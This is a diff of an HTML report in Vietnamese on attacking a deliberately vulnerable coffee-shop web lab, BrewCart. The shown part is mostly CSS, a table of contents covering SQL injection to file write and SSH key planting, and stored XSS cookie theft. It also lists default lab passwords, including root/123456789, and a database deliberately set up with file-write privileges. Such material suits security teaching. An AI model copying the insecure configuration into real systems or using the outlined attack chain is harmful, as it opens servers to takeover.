@@ -3,830 +3,1239 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Báo Cáo Phân Tích Lỗ Hổng Web Theo Chuẩn PortSwigger Web Security Academy</title>
+    <title>BÁO CÁO PHÂN TÍCH VÀ KHAI THÁC LỖ HỔNG BẢO MẬT — BREWCART LAB</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-main: #0f172a;
-            --bg-card: #1e293b;
-            --bg-subtle: #334155;
-            --border-color: #475569;
-            --text-main: #f8fafc;
-            --text-muted: #94a3b8;
-            --coffee-primary: #d97706;
-            --danger: #ef4444;
-            --danger-bg: rgba(239, 68, 68, 0.15);
-            --warning: #f59e0b;
-            --warning-bg: rgba(245, 158, 11, 0.15);
-            --success: #10b981;
-            --success-bg: rgba(16, 185, 129, 0.15);
-            --info: #38bdf8;
-            --info-bg: rgba(56, 189, 248, 0.15);
+            /* Bright / Light Theme Palette */
+            --bg-primary: #f8fafc;
+            --bg-secondary: #ffffff;
+            --bg-tertiary: #f1f5f9;
+            --bg-card: #ffffff;
+            --border-color: #e2e8f0;
+            --border-highlight: #93c5fd;
+            --text-main: #0f172a;
+            --text-body: #334155;
+            --text-muted: #64748b;
+            --text-sub: #94a3b8;
+            
+            --primary: #0284c7;
+            --primary-dark: #0369a1;
+            --primary-light: #f0f9ff;
+            --primary-border: #bae6fd;
+            
+            --red: #e11d48;
+            --red-bg: #fff1f2;
+            --red-border: #fecdd3;
+            
+            --green: #059669;
+            --green-bg: #ecfdf5;
+            --green-border: #a7f3d0;
+            
+            --amber: #d97706;
+            --amber-bg: #fffbeb;
+            --amber-border: #fde68a;
+            
+            --code-bg: #0f172a;
+            --code-text: #f8fafc;
+            
+            --radius-sm: 6px;
+            --radius-md: 10px;
+            --radius-lg: 16px;
+            
+            --shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.05);
+            --shadow-md: 0 4px 14px -2px rgba(0, 0, 0, 0.06), 0 2px 6px -1px rgba(0, 0, 0, 0.03);
+            --shadow-lg: 0 10px 25px -3px rgba(0, 0, 0, 0.08), 0 4px 10px -2px rgba(0, 0, 0, 0.04);
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background-color: var(--bg-main);
-            color: var(--text-main);
-            line-height: 1.65;
+            background-color: var(--bg-primary);
+            color: var(--text-body);
+            line-height: 1.7;
             font-size: 15px;
+            scroll-behavior: smooth;
         }
 
-        /* Top Header */
-        header.top-bar {
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            background: rgba(15, 23, 42, 0.95);
-            backdrop-filter: blur(12px);
-            border-bottom: 1px solid var(--border-color);
-            padding: 14px 28px;
+        /* Layout Grid */
+        .page-container {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .logo-area { display: flex; align-items: center; gap: 12px; }
-        .logo-badge {
-            background: linear-gradient(135deg, #b45309, #d97706);
-            color: white;
-            font-weight: 800;
-            padding: 6px 12px;
-            border-radius: 8px;
-            font-size: 1rem;
-            letter-spacing: -0.5px;
-        }
-        .top-nav { display: flex; gap: 20px; font-size: 14px; font-weight: 500; }
-        .top-nav a { color: var(--text-muted); text-decoration: none; transition: color 0.2s; }
-        .top-nav a:hover { color: var(--coffee-primary); }
-
-        /* Main Container Layout */
-        .wrapper {
-            max-width: 1380px;
-            margin: 0 auto;
-            padding: 30px 24px 80px;
-            display: grid;
-            grid-template-columns: 290px 1fr;
-            gap: 36px;
+            min-height: 100vh;
         }
 
         /* Sidebar Navigation */
-        aside.sidebar {
+        .sidebar {
+            width: 290px;
+            background: var(--bg-secondary);
+            border-right: 1px solid var(--border-color);
             position: sticky;
-            top: 80px;
-            height: calc(100vh - 100px);
+            top: 0;
+            height: 100vh;
             overflow-y: auto;
-            padding-right: 12px;
+            padding: 28px 20px;
+            flex-shrink: 0;
+            box-shadow: 2px 0 12px rgba(0, 0, 0, 0.02);
         }
-        aside.sidebar::-webkit-scrollbar { width: 5px; }
-        aside.sidebar::-webkit-scrollbar-thumb { background: var(--bg-subtle); border-radius: 4px; }
-        .sidebar-title {
-            font-size: 12px;
+
+        .sidebar-brand {
+            font-size: 1.25rem;
+            font-weight: 800;
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .sidebar-brand span { color: var(--primary); }
+        .sidebar-badge {
+            font-size: 0.68rem;
             text-transform: uppercase;
-            letter-spacing: 0.1em;
-            color: var(--text-muted);
-            margin-bottom: 12px;
+            padding: 2px 8px;
+            background: var(--red-bg);
+            color: var(--red);
+            border: 1px solid var(--red-border);
+            border-radius: 4px;
             font-weight: 700;
         }
-        .nav-list { list-style: none; display: flex; flex-direction: column; gap: 4px; }
-        .nav-list li a {
-            display: block;
-            padding: 8px 12px;
-            border-radius: 6px;
-            color: var(--text-muted);
-            text-decoration: none;
-            font-size: 13px;
-            transition: all 0.2s;
+
+        .nav-group-title {
+            font-size: 0.72rem;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: var(--text-sub);
+            font-weight: 700;
+            margin: 20px 0 8px;
         }
-        .nav-list li a:hover, .nav-list li a.active {
-            background: var(--bg-card);
-            color: var(--coffee-primary);
-            border-left: 3px solid var(--coffee-primary);
+
+        .nav-link {
+            display: block;
+            color: #475569;
+            text-decoration: none;
+            padding: 8px 12px;
+            border-radius: var(--radius-sm);
+            font-size: 0.88rem;
+            font-weight: 500;
+            transition: all 0.2s ease;
+            margin-bottom: 2px;
+        }
+
+        .nav-link:hover, .nav-link.active {
+            color: var(--primary-dark);
+            background: var(--primary-light);
+            border-left: 3px solid var(--primary);
             font-weight: 600;
         }
 
-        /* Content Area */
-        main.content { min-width: 0; }
-
-        .hero-banner {
-            background: linear-gradient(135deg, rgba(30, 41, 59, 0.8), rgba(217, 119, 6, 0.12));
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 32px 36px;
-            margin-bottom: 36px;
+        /* Main Content */
+        .content {
+            flex: 1;
+            padding: 44px 56px;
+            max-width: 1100px;
         }
-        .hero-banner h1 {
-            font-size: 2.05rem;
+
+        /* Hero Header */
+        .hero {
+            background: linear-gradient(135deg, #ffffff 0%, #f0f9ff 100%);
+            border: 1.5px solid var(--primary-border);
+            border-radius: var(--radius-lg);
+            padding: 36px 40px;
+            margin-bottom: 40px;
+            box-shadow: var(--shadow-md);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -40px;
+            right: -40px;
+            width: 180px;
+            height: 180px;
+            background: radial-gradient(circle, rgba(2, 132, 199, 0.12) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+
+        .hero-title {
+            font-size: 2.1rem;
             font-weight: 800;
-            color: #ffffff;
-            margin-bottom: 10px;
-            letter-spacing: -0.02em;
+            letter-spacing: -0.03em;
+            color: var(--text-main);
+            margin-bottom: 12px;
+            line-height: 1.25;
         }
-        .hero-banner p { color: var(--text-muted); font-size: 15px; max-width: 860px; }
 
-        .meta-tags {
+        .hero-meta {
             display: flex;
             flex-wrap: wrap;
             gap: 12px;
+            font-size: 0.88rem;
+            color: var(--text-muted);
             margin-top: 18px;
         }
-        .tag-pill {
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 12.5px;
-            color: var(--text-muted);
-            display: flex;
+
+        .hero-meta-item {
+            display: inline-flex;
             align-items: center;
             gap: 6px;
+            background: #ffffff;
+            padding: 6px 14px;
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border-color);
+            box-shadow: var(--shadow-sm);
+            color: var(--text-body);
         }
-        .tag-pill strong { color: var(--text-main); }
 
-        /* Section Headings */
-        section { margin-bottom: 50px; scroll-margin-top: 90px; }
-        h2.section-header {
-            font-size: 1.45rem;
-            font-weight: 700;
-            color: #ffffff;
-            border-bottom: 1px solid var(--border-color);
+        /* Headings */
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: var(--text-main);
+            margin: 48px 0 20px;
             padding-bottom: 12px;
-            margin-bottom: 24px;
+            border-bottom: 2px solid var(--border-color);
             display: flex;
             align-items: center;
             gap: 10px;
         }
 
-        /* Vulnerability Matrix Table */
-        .table-responsive {
-            overflow-x: auto;
-            border-radius: 12px;
-            border: 1px solid var(--border-color);
-            margin-bottom: 30px;
+        h3 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--text-main);
+            margin: 32px 0 14px;
         }
-        table.matrix-table {
+
+        h4 {
+            font-size: 1.05rem;
+            font-weight: 700;
+            color: var(--text-body);
+            margin: 20px 0 10px;
+        }
+
+        p { margin-bottom: 16px; color: var(--text-body); }
+
+        /* Cards & Blocks */
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            padding: 24px;
+            margin-bottom: 24px;
+            box-shadow: var(--shadow-sm);
+            transition: box-shadow 0.2s;
+        }
+
+        .card:hover {
+            box-shadow: var(--shadow-md);
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+            gap: 10px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #f1f5f9;
+        }
+
+        /* Badges & Pills */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            padding: 4px 10px;
+            border-radius: 999px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+        }
+
+        .badge-critical { background: var(--red-bg); color: var(--red); border: 1px solid var(--red-border); }
+        .badge-high { background: var(--amber-bg); color: var(--amber); border: 1px solid var(--amber-border); }
+        .badge-medium { background: var(--primary-light); color: var(--primary-dark); border: 1px solid var(--primary-border); }
+        .badge-success { background: var(--green-bg); color: var(--green); border: 1px solid var(--green-border); }
+
+        /* Tables */
+        table {
             width: 100%;
             border-collapse: collapse;
-            text-align: left;
-            font-size: 13.5px;
-            background: var(--bg-card);
+            margin: 18px 0 24px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            overflow: hidden;
+            font-size: 0.9rem;
+            box-shadow: var(--shadow-sm);
         }
-        table.matrix-table th {
-            background: #111827;
-            padding: 12px 16px;
-            font-weight: 600;
-            color: var(--text-muted);
+
+        th, td {
+            padding: 13px 16px;
+            text-align: left;
             border-bottom: 1px solid var(--border-color);
         }
-        table.matrix-table td {
-            padding: 12px 16px;
-            border-bottom: 1px solid rgba(71, 85, 105, 0.5);
-        }
-        table.matrix-table tr:hover { background: rgba(51, 65, 85, 0.4); }
 
-        /* Badges */
-        .badge {
-            display: inline-block;
-            padding: 3px 8px;
-            border-radius: 6px;
-            font-size: 11px;
+        th {
+            background: var(--bg-tertiary);
+            color: var(--text-main);
             font-weight: 700;
+            font-size: 0.82rem;
             text-transform: uppercase;
             letter-spacing: 0.05em;
         }
-        .badge-critical { background: var(--danger-bg); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.4); }
-        .badge-high { background: var(--warning-bg); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.4); }
-        .badge-medium { background: var(--info-bg); color: #7dd3fc; border: 1px solid rgba(56, 189, 248, 0.4); }
 
-        /* Vulnerability Deep Dive Cards */
-        .vuln-card {
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 14px;
-            padding: 28px;
-            margin-bottom: 36px;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
-        }
-        .vuln-card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            margin-bottom: 20px;
-            border-bottom: 1px solid rgba(71, 85, 105, 0.6);
-            padding-bottom: 16px;
-        }
-        .vuln-title { font-size: 1.3rem; font-weight: 700; color: #fff; }
-        .vuln-meta-bar {
-            display: flex;
-            gap: 16px;
-            margin-top: 8px;
-            font-size: 13px;
-            color: var(--text-muted);
-            flex-wrap: wrap;
-        }
-        .vuln-meta-bar span strong { color: var(--coffee-primary); }
+        tr:last-child td { border-bottom: none; }
+        tr:hover td { background: #f8fafc; }
 
-        .callout {
-            border-left: 4px solid var(--coffee-primary);
-            background: rgba(217, 119, 6, 0.08);
-            padding: 14px 18px;
-            border-radius: 0 8px 8px 0;
-            margin: 18px 0;
-            font-size: 14px;
-        }
-        .callout-title { font-weight: 700; color: var(--coffee-primary); margin-bottom: 4px; }
-
-        .callout.danger {
-            border-left-color: var(--danger);
-            background: var(--danger-bg);
-        }
-        .callout.danger .callout-title { color: #f87171; }
-
-        .callout.success {
-            border-left-color: var(--success);
-            background: var(--success-bg);
-        }
-        .callout.success .callout-title { color: #34d399; }
-
-        /* Code snippets */
+        /* Code Blocks */
         pre {
-            background: #090d16;
+            background: var(--code-bg);
             border: 1px solid #1e293b;
-            border-radius: 8px;
-            padding: 14px 16px;
+            border-radius: var(--radius-md);
+            padding: 18px;
             overflow-x: auto;
-            margin: 14px 0;
-            font-family: 'JetBrains Mono', Consolas, monospace;
-            font-size: 13px;
-            line-height: 1.5;
-            color: #e2e8f0;
+            margin: 14px 0 20px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.88rem;
+            line-height: 1.6;
+            color: var(--code-text);
+            box-shadow: var(--shadow-sm);
         }
-        code {
-            font-family: 'JetBrains Mono', Consolas, monospace;
-            background: rgba(51, 65, 85, 0.5);
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-size: 12.5px;
-            color: #f1f5f9;
-        }
-        pre code { background: transparent; padding: 0; font-size: 13px; }
 
-        /* Screenshots Showcase */
-        .screenshot-box {
-            margin: 22px 0;
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            overflow: hidden;
-            background: #090d16;
+        code {
+            font-family: 'Fira Code', monospace;
+            background: #f1f5f9;
+            color: #0284c7;
+            padding: 2px 7px;
+            border-radius: 4px;
+            font-size: 0.88em;
+            border: 1px solid #e2e8f0;
+            font-weight: 600;
         }
-        .screenshot-box img {
-            width: 100%;
-            height: auto;
-            display: block;
-            border-bottom: 1px solid var(--border-color);
+
+        pre code {
+            background: transparent;
+            padding: 0;
+            border: none;
+            color: inherit;
+            font-weight: 400;
         }
-        .screenshot-caption {
-            padding: 10px 16px;
-            font-size: 13px;
-            color: var(--text-muted);
-            background: #111827;
+
+        /* Callout Boxes */
+        .callout {
+            border-left: 4px solid var(--primary);
+            background: var(--primary-light);
+            border-top: 1px solid var(--primary-border);
+            border-right: 1px solid var(--primary-border);
+            border-bottom: 1px solid var(--primary-border);
+            padding: 16px 20px;
+            border-radius: 0 var(--radius-md) var(--radius-md) 0;
+            margin: 20px 0;
+        }
+
+        .callout-danger {
+            border-left-color: var(--red);
+            background: var(--red-bg);
+            border-top-color: var(--red-border);
+            border-right-color: var(--red-border);
+            border-bottom-color: var(--red-border);
+        }
+
+        .callout-success {
+            border-left-color: var(--green);
+            background: var(--green-bg);
+            border-top-color: var(--green-border);
+            border-right-color: var(--green-border);
+            border-bottom-color: var(--green-border);
+        }
+
+        .callout-warning {
+            border-left-color: var(--amber);
+            background: var(--amber-bg);
+            border-top-color: var(--amber-border);
+            border-right-color: var(--amber-border);
+            border-bottom-color: var(--amber-border);
+        }
+
+        .callout-title {
+            font-weight: 700;
+            margin-bottom: 6px;
+            color: var(--text-main);
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            gap: 8px;
         }
-        .screenshot-caption strong { color: var(--coffee-primary); }
 
-        ol.step-list {
-            padding-left: 20px;
-            margin: 14px 0;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
+        .callout-success .callout-title { color: #065f46; }
+        .callout-warning .callout-title { color: #92400e; }
+        .callout-danger .callout-title { color: #9f1239; }
+
+        /* Lists */
+        ul, ol { margin: 12px 0 18px 24px; color: var(--text-body); }
+        li { margin-bottom: 8px; line-height: 1.65; }
+
+        /* Step Card */
+        .step-box {
+            background: #f8fafc;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            padding: 20px;
+            margin-bottom: 20px;
         }
-        ol.step-list li { color: #e2e8f0; }
 
-        footer.doc-footer {
-            border-top: 1px solid var(--border-color);
-            padding: 30px 0;
+        .step-num {
+            display: inline-block;
+            width: 28px;
+            height: 28px;
+            line-height: 28px;
             text-align: center;
-            font-size: 13.5px;
+            background: var(--primary);
+            color: #ffffff;
+            font-weight: 800;
+            border-radius: 50%;
+            font-size: 0.85rem;
+            margin-right: 8px;
+        }
+
+        /* Response Terminal */
+        .terminal {
+            background: #0f172a;
+            border: 1px solid #1e293b;
+            border-radius: var(--radius-sm);
+            padding: 14px 18px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: #38bdf8;
+            margin: 12px 0 16px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.4);
+        }
+
+        .terminal.danger { color: #fca5a5; border-color: #7f1d1d; background: #1a0f14; }
+        .terminal.success { color: #86efac; border-color: #14532d; background: #061910; }
+
+        /* Footer */
+        .report-footer {
+            margin-top: 60px;
+            padding-top: 24px;
+            border-top: 1px solid var(--border-color);
             color: var(--text-muted);
-            margin-top: 40px;
+            font-size: 0.88rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        @media (max-width: 900px) {
+            .page-container { flex-direction: column; }
+            .sidebar { width: 100%; height: auto; position: static; }
+            .content { padding: 24px 20px; }
         }
     </style>
 </head>
 <body>
-
-    <!-- Header -->
-    <header class="top-bar">
-        <div class="logo-area">
-            <div class="logo-badge">PORTSWIGGER LAB WRITEUP</div>
-            <span style="font-weight: 700; color: #fff;">Báo Cáo Phân Tích Lỗ Hổng Ứng Dụng Web Chuẩn PortSwigger</span>
-        </div>
-        <nav class="top-nav">
-            <a href="#tong-quan">Tổng quan</a>
-            <a href="#ma-tran-lo-hong">Ma trận lỗ hổng</a>
-            <a href="#chi-tiet-lo-hong">Phân tích kỹ thuật</a>
-            <a href="#khac-phuc">Biện pháp phòng thủ</a>
-        </nav>
-    </header>
-
-    <div class="wrapper">
-        <!-- Sidebar Navigation -->
+    <div class="page-container">
+        <!-- Sidebar Menu -->
         <aside class="sidebar">
-            <div class="sidebar-title">Chủ đề PortSwigger Academy</div>
-            <ul class="nav-list">
-                <li><a href="#tong-quan">1. Tổng quan hệ thống lab</a></li>
-                <li><a href="#ma-tran-lo-hong">2. Bảng phân loại PortSwigger</a></li>
-                <li><a href="#topic-access-control">3. Access Control Vulnerabilities</a></li>
-                <li><a href="#topic-idor">4. Insecure Direct Object References</a></li>
-                <li><a href="#topic-ssrf">5. Server-Side Request Forgery</a></li>
-                <li><a href="#topic-sqli">6. SQL Injection</a></li>
-                <li><a href="#topic-file-upload">7. File Upload Vulnerabilities</a></li>
-                <li><a href="#topic-xss">8. Cross-Site Scripting</a></li>
-                <li><a href="#topic-business-logic">9. Business Logic Vulnerabilities</a></li>
-                <li><a href="#khac-phuc">10. Hướng dẫn phòng thủ chuẩn</a></li>
-            </ul>
+            <div class="sidebar-brand">
+                Brew<span>Cart</span>
+                <span class="sidebar-badge">LAB WRITEUP</span>
+            </div>
+
+            <div class="nav-group-title">Mục Lục Báo Cáo</div>
+            <a class="nav-link" href="#overview">1. Tổng Quan Kiến Trúc Lab</a>
+            <a class="nav-link" href="#matrix">2. Ma Trận Lỗ Hổng Bảo Mật</a>
+            
+            <div class="nav-group-title">Chuyên Đề 1: SQL Injection</div>
+            <a class="nav-link" href="#sqli-error">&bull; 3.1 Error-Based SQLi</a>
+            <a class="nav-link" href="#sqli-union">&bull; 3.2 In-Band UNION SELECT</a>
+            <a class="nav-link" href="#sqli-priv">&bull; 3.3 Chứng Minh Quyền Ghi File</a>
+            <a class="nav-link" href="#sqli-outfile">&bull; 3.4 Ghi File (INTO OUTFILE)</a>
+            <a class="nav-link" href="#sqli-ssh">&bull; 3.5 Tích Hợp SSH &amp; Write Key</a>
+            <a class="nav-link" href="#sqli-blind">&bull; 3.6 Time-Based Blind SQLi</a>
+            <a class="nav-link" href="#sqli-defense">&bull; 3.7 Biện Pháp Khắc Phục SQLi</a>
+
+            <div class="nav-group-title">Chuyên Đề 2: XSS</div>
+            <a class="nav-link" href="#xss-stored">&bull; 4.1 Stored XSS &amp; Cookie Theft</a>
+            <a class="nav-link" href="#xss-reflected">&bull; 4.2 Reflected XSS Tìm Kiếm</a>
+            <a class="nav-link" href="#xss-upload">&bull; 4.3 Stored XSS Qua File Upload</a>
+            <a class="nav-link" href="#xss-defense">&bull; 4.4 Biện Pháp Khắc Phục XSS</a>
+
+            <div class="nav-group-title">Kiểm Định &amp; Tự Động Hóa</div>
+            <a class="nav-link" href="#fixed-vulns">5. Kiểm Tra Các Lỗi Đã Vá</a>
+            <a class="nav-link" href="#automation">6. Script Test Tự Động (test_lab.py)</a>
+            <a class="nav-link" href="#conclusion">7. Kết Luận &amp; Tổng Kết</a>
         </aside>
 
-        <!-- Main Content -->
+        <!-- Main Body Content -->
         <main class="content">
+            <!-- Hero Header -->
+            <header class="hero">
+                <div class="hero-title">BÁO CÁO PHÂN TÍCH VÀ KHAI THÁC LỖ HỔNG BẢO MẬT</div>
+                <p style="color: var(--primary-dark); font-weight: 700; font-size: 1.15rem; margin-bottom: 8px;">
+                    Chuyên đề Chuyên sâu: SQL Injection (SQLi) &amp; Cross-Site Scripting (XSS)
+                </p>
+                <p style="color: var(--text-body); font-size: 0.95rem; margin-bottom: 0;">
+                    Môi trường thực nghiệm: Hệ thống thương mại điện tử <strong>BrewCart E-Commerce</strong> xây dựng trên kiến trúc chuẩn PHP MVC (PHP 7.4 Apache) kết nối MariaDB 10.11 và máy chủ OpenSSH được cô lập hoàn toàn qua Docker Compose.
+                </p>
 
-            <!-- Hero Banner -->
-            <div class="hero-banner" id="tong-quan">
-                <h1>Báo Cáo Kiểm Thử & Phân Tích Kỹ Thuật Lỗ Hổng Web</h1>
-                <p>Tài liệu chuẩn hóa toàn bộ các lỗ hổng tồn tại trên hệ thống BrewCart theo đúng cấu trúc phân loại học tập của PortSwigger Web Security Academy. Mỗi mục trình bày trực diện nguyên nhân kỹ thuật trong mã nguồn, bằng chứng khai thác thực tế và mã nguồn đã khắc phục an toàn.</p>
-                <div class="meta-tags">
-                    <div class="tag-pill"><span>Phân loại chuẩn:</span> <strong>PortSwigger Web Security Academy</strong></div>
-                    <div class="tag-pill"><span>Nền tảng thực thi:</span> <strong>Node.js, Express, MariaDB, Docker</strong></div>
-                    <div class="tag-pill"><span>Địa chỉ lab:</span> <strong>http://localhost:3000</strong></div>
-                    <div class="tag-pill"><span>Phạm vi kiểm thử:</span> <strong>Toàn bộ API và giao diện Web</strong></div>
+                <div class="hero-meta">
+                    <div class="hero-meta-item">🎯 <strong>Mục tiêu:</strong> Đánh giá An toàn Ứng dụng Web</div>
+                    <div class="hero-meta-item">🛡️ <strong>Hạ tầng:</strong> Docker Compose (Linux)</div>
+                    <div class="hero-meta-item">🌐 <strong>Web:</strong> localhost:3000</div>
+                    <div class="hero-meta-item">🔑 <strong>SSH:</strong> localhost:2022 / 2222</div>
+                    <div class="hero-meta-item">⚡ <strong>Kiểm định:</strong> 100% Passed (test_lab.py)</div>
                 </div>
-            </div>
+            </header>
 
-            <!-- Credentials Information -->
-            <div class="callout" style="margin-bottom: 30px;">
-                <div class="callout-title">Thông tin tài khoản kiểm thử trên hệ thống</div>
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 14px; margin-top: 10px;">
-                    <div style="background: var(--bg-card); padding: 12px; border-radius: 8px; border: 1px solid var(--border-color);">
-                        <strong>👑 Quản trị viên:</strong><br>
-                        Email: <code>admin@gmail.com</code><br>
-                        Mật khẩu: <code>Admin123!</code><br>
-                        Quyền hạn: <code>admin</code>
-                    </div>
-                    <div style="background: var(--bg-card); padding: 12px; border-radius: 8px; border: 1px solid var(--border-color);">
-                        <strong>👤 Khách hàng thông thường:</strong><br>
-                        Email: <code>huy@gmail.com</code><br>
-                        Mật khẩu: <code>user123</code><br>
-                        Quyền hạn: <code>customer</code>
-                    </div>
-                    <div style="background: var(--bg-card); padding: 12px; border-radius: 8px; border: 1px solid var(--border-color);">
-                        <strong>🧪 Tài khoản kiểm thử phụ:</strong><br>
-                        Email: <code>test@test.com</code><br>
-                        Mật khẩu: <code>test123</code><br>
-                        Quyền hạn: <code>customer</code>
-                    </div>
-                </div>
-            </div>
+            <!-- ========================================================================= -->
+            <!-- 1. TỔNG QUAN KIẾN TRÚC LAB                                               -->
+            <!-- ========================================================================= -->
+            <section id="overview">
+                <h2>1. Tổng Quan Kiến Trúc Môi Trường Lab</h2>
+                <p>
+                    Hệ thống phòng lab BrewCart được thiết kế nhằm phục vụ mục đích giảng dạy và đánh giá an toàn thông tin chuyên sâu. Ứng dụng mô phỏng hoàn chỉnh một cửa hàng cà phê trực tuyến hiện đại với đầy đủ luồng nghiệp vụ: trang chủ nổi bật, danh mục thực đơn, tìm kiếm sản phẩm, gửi đánh giá nhận xét và bảng điều khiển quản trị (Admin Panel).
+                </p>
 
-            <!-- Screenshot Overview -->
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px;">
-                <div class="screenshot-box">
-                    <img src="screenshots/01_homepage.png" alt="Giao diện trang chủ">
-                    <div class="screenshot-caption">
-                        <span>Hình 1.1: Giao diện trang chủ ứng dụng</span>
-                        <strong>Trang chủ</strong>
+                <div class="card">
+                    <div class="card-header">
+                        <strong style="color: var(--text-main); font-size: 1.05rem;">Cấu Trúc Dịch Vụ Docker Compose</strong>
+                        <span class="badge badge-medium">Multi-Container Architecture</span>
                     </div>
-                </div>
-                <div class="screenshot-box">
-                    <img src="screenshots/02_store_catalog.png" alt="Giao diện cửa hàng">
-                    <div class="screenshot-caption">
-                        <span>Hình 1.2: Danh mục sản phẩm và khu vực lọc</span>
-                        <strong>Cửa hàng</strong>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Vulnerability Matrix Section -->
-            <section id="ma-tran-lo-hong">
-                <h2 class="section-header">2. Bảng Tổng Hợp Lỗ Hổng Theo Chủ Đề PortSwigger</h2>
-                <div class="table-responsive">
-                    <table class="matrix-table">
+                    <table>
                         <thead>
                             <tr>
-                                <th>#</th>
-                                <th>Chủ Đề PortSwigger Academy</th>
-                                <th>Dạng Lỗ Hổng Cụ Thể</th>
-                                <th>Mức Độ</th>
-                                <th>Điểm Lỗi API và Giao Diện</th>
-                                <th>Trạng Thái Kiểm Thử</th>
+                                <th>Container</th>
+                                <th>Cổng Expose</th>
+                                <th>Công Nghệ Cốt Lõi</th>
+                                <th>Vai Trò &amp; Đặc Điểm Kỹ Thuật</th>
                             </tr>
                         </thead>
                         <tbody>
                             <tr>
-                                <td>1</td>
-                                <td><strong>Access Control Vulnerabilities</strong></td>
-                                <td>Vertical privilege escalation và Mass assignment</td>
-                                <td><span class="badge badge-critical">Critical</span></td>
-                                <td><code>GET /api/member/users</code> & <code>PATCH /api/member/profile</code></td>
-                                <td><span class="badge" style="background:var(--success-bg); color:#34d399;">Xác nhận</span></td>
+                                <td><strong>vulnerable-app</strong></td>
+                                <td><code>3000:80</code><br><code>2022:22</code></td>
+                                <td>PHP 7.4 Apache MVC<br>OpenSSH Server 8.4</td>
+                                <td>
+                                    Ứng dụng Web MVC tách bạch riêng biệt giữa Views (UI) và Controllers / Models (Logic). Tích hợp sẵn OpenSSH Server (tài khoản: <code>root</code> / <code>123456789</code>, <code>admin</code> / <code>123456789</code>).
+                                </td>
                             </tr>
                             <tr>
-                                <td>2</td>
-                                <td><strong>Insecure Direct Object References</strong></td>
-                                <td>Insecure direct object references trên đơn hàng</td>
-                                <td><span class="badge badge-high">High</span></td>
-                                <td><code>GET /api/member/orders/:id</code> & <code>/invoice</code></td>
-                                <td><span class="badge" style="background:var(--success-bg); color:#34d399;">Xác nhận</span></td>
+                                <td><strong>mysql</strong></td>
+                                <td><code>3306</code> (Nội bộ)</td>
+                                <td>MariaDB 10.11 Server</td>
+                                <td>
+                                    CSDL lưu trữ thông tin sản phẩm, đơn hàng, tài khoản và đánh giá. Được khởi động với tham số <code>--secure-file-priv="" --local-infile=1</code> và cấp quyền <code>GRANT FILE ON *.*</code> cho tài khoản <code>brewcart_user</code> nhằm phục vụ bài học đọc/ghi file tùy ý.
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="callout callout-success">
+                    <div class="callout-title">🔑 Danh Sách Tài Khoản Mặc Định Khởi Tạo Sẵn Trong Lab</div>
+                    <ul style="margin-bottom: 0;">
+                        <li><strong>Tài khoản Quản trị Web (Admin):</strong> <code>admin@gmail.com</code> / Mật khẩu: <code>Admin123!</code> (Role: <code>admin</code>)</li>
+                        <li><strong>Tài khoản Khách hàng (Customer):</strong> <code>huy@gmail.com</code> / Mật khẩu: <code>user123</code> (Role: <code>customer</code>)</li>
